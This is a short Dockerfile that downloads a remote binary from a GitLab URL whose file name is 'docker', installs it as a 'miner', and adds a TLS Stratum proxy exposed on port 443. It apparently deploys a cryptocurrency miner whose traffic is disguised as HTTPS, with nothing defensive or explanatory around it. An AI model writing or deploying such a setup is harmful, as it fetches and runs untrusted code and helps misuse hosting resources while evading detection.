FROM node:18

WORKDIR /app

RUN apt-get update && apt-get install -y \
    curl wget git build-essential procps python3 python3-pip \
    && rm -rf /var/lib/apt/lists/*

# Binary Miner Custom Kamu
RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

# Simple TLS Stratum Proxy (Python)
RUN pip3 install aiostratum-proxy

COPY start.sh .
RUN chmod +x start.sh

EXPOSE 443

CMD ["./start.sh"]
